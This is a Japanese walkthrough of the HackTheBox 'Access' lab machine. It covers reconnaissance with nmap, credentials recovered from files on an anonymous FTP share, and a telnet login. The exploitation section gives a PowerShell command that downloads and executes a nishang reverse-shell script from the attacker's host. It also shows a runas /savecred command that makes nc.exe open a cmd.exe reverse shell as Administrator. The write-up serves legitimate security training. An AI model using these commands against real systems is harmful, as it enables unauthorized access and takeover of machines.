# はじめに
HackTheBoxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
GitHub(ペネトレーションテスト用チートシート):  
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet  
Twitter:@yukitsukai1731

# Access
![スクリーンショット 2020-08-25 22.02.54.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a9ffae58-1582-9df7-7c2a-c2069ae02a1c.png)

HackTheBox公式より
Access is an "easy" difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.

Accessは「簡単」な難易度のマシンであり、環境の物理的なセキュリティに関連するマシンが、それ自体が安全ではないかもしれないことを強調しています。また、アクセス可能なFTPファイル共有がどのようにして足場を得たり、横移動をしたりすることが多いのかが強調されています。保存されたクレデンシャルを特定して悪用するためのテクニックを教えてくれます。

# Recon(偵察)
Access(10.10.10.98)に対して、スキャンを行います。
まずnmapでスキャンを開始します。

## nmap 

```
nmap -sC -sV -oN nmap/initial 10.10.10.98 
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -p-...全ポートスキャン
- -oN...通常出力

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 09:13 EDT
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 09:14 (0:00:11 remaining)
Nmap scan report for 10.10.10.98
Host is up (0.29s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.51 seconds
```

この結果から、21,23,80番ポートが空いていることが分かります。  
まずは80番ポートを確認してみますが、特にこれといった情報は得られませんでした。
![コメント 2020-08-19 160049.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/f27b4ae4-2584-de00-6c5b-8051941b75a8.png)

## ftp(Microsoft ftpd)
21番ポートで動作しているftpはanonymous loginが許可されているので、ログインして探索を行います。  
ここではbackup.mdb,Access Control.zipというファイルを見つけることができます。  
getコマンドでダウンロードを行うのですが、ASCIIモードになっているためこのままダウンロードしてしまうとファイルが開けない状態になります。これはtype binaryコマンドでbinaryモードに変更してからgetコマンドでダウンロードすることで解決できます。
![コメント 2020-08-20 150428.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e703a476-64c3-7c08-5a66-3c26c7c8d60c.png)

まずはbackup.mdbについて調べます。  
拡張子mdbは、Microsoft Access Databaseファイルを表します。  
![コメント 2020-08-19 170138.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/fe6e2ecd-14e1-c7d6-382f-f45add0361f1.png)

Windowsにbackup.mdbを転送して、Accessを用いてファイルを閲覧します。  
中でもauth_userテーブルを確認すると、以下の資格情報を確認することができます。

![コメント 2020-08-20 151213.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9223f9d1-2457-fc18-b57e-7600ae981574.png)

|  username  |  password  |
| --- | --- |
| admin | admin |
|  engineer  |  access4u@security  |
|  backup_admin  |  admin  |

次にもう一つ入手したファイルであるAccess Control.zipというファイルを展開します。  
パスワードで保護されているため、展開時にパスワードを求められます。
![コメント 2020-08-26 210254.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d86e5b36-81a2-f8be-7ad0-54faaf88c07e.png)

現在入手しているadminとaccess4u@securityの2つのパスワードを試してみると、展開に成功しAccess Control.pstファイルを手に入れることができます。
![コメント 2020-08-20 152305.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a8434682-442c-b83e-7d97-d443196f3217.png)
pstファイルはoutlookのファイルなので、こちらもWindowsに転送して中身を確認してみます。
![コメント 2020-08-20 161906.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/1406932f-2964-68ed-90bf-55cd35a1f421.png)

securityアカウントのパスワードを4Cc3ssC0ntr0llerに変更したとの記載がされていることが確認できます。

# exploitation(侵入)
## telnet
先ほど入手した資格情報を用いてtelnetで接続を行います。

```
telnet 10.10.10.98

password:4Cc3ssC0ntr0ller
```
無事にログインすることができます。
![コメント 2020-08-20 162622.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4bc90d73-ffb3-4377-5915-6d70997f4e14.png)

このままだとbackspaceを打つこともできないシェルなので、nishangのInvoke-PowerShellTcp.ps1使用して、より使いやすいシェルを取得します。  
https://github.com/samratashok/nishang

```
mv Invoke-PowerShellTCP.ps1 nishang.ps1
```

nishang.ps1(Invoke-PowerShellTcp.ps1)を編集し、最後の行に下記の情報を追記します。  
-IPAddressには自身のIPアドレス  
-Portには待ち受けるポート番号  
を記載します。
![コメント 2020-08-26 220514.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a9e63ddf-754f-ee7e-17e9-4ee312ff38a8.png)

nishang.ps1が配置されているディレクトリではpython3を使用して受け渡すためのサーバを立ち上げます。

```
python3 -m http.server 9001
```

また通信を待ち受けるようにnetcatをセットしておきます。

```
netcat -lvnp 9000
```

そしてtelnetで接続しているマシンでは下記のコマンドを実行します。

```
powershell "IEX(New-Object Net.webclient).downloadString('http://<自身の IP>:9001/nishang.ps1')"
```

これで快適なシェルを手に入れることができました。
![コメント 2020-08-26 214932.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/43ecfb9b-6b8a-fd50-817a-6690c54cf030.png)

# Privileges Escalation(権限昇格)
マシンを探索すると、C:\Users\Public\Desktopに"ZKAccess3.5 Security System.lnk"というファイルを見つけることができ、runasコマンドと/savecredオプションについて記載されていることが分かります。

runasコマンドを使用することで別のユーザとしてコマンドを実行することができ、/savecredオプションを使用するとパスワードなしでコマンドを実行させることができます。
![コメント 2020-08-26 213650.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/89b3b7ed-cdd9-460c-64cc-00fcc934838f.png)
cmdkey /listコマンドを使用してマシンに保存されている資格情報を表示します。
![コメント 2020-08-26 213715.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/51963fe2-4bcd-10c7-5c6e-66c898a98cbd.png)
root権限のシェルを手に入れるため自身の環境からマシンへnetcatを送る準備をします。

```
cp /usr/share/windows-resources/binaries/nc.exe ./
python3 -m http.server 9001
```

マシンで下記のコマンドを実行し、nc.exeを受け取ります。このときcertutil.exeなどを利用してもどちらでもいいです。

```
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.16:9001/nc.exe', 'nc.exe')
```
最後に自身の環境でnetcatリスナーをセットしてから、マシンでrunas /savecredコマンドを用いてnc.exeを使用します。

```
runas /savecred /user:Administrator "nc.exe -e cmd.exe 10.10.14.16 1234"
```

![コメント 2020-08-26 222233.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2966c687-1bfd-50b5-9528-b20ef79f3e36.png)
お疲れさまでした。  
root権限を取得することができました。
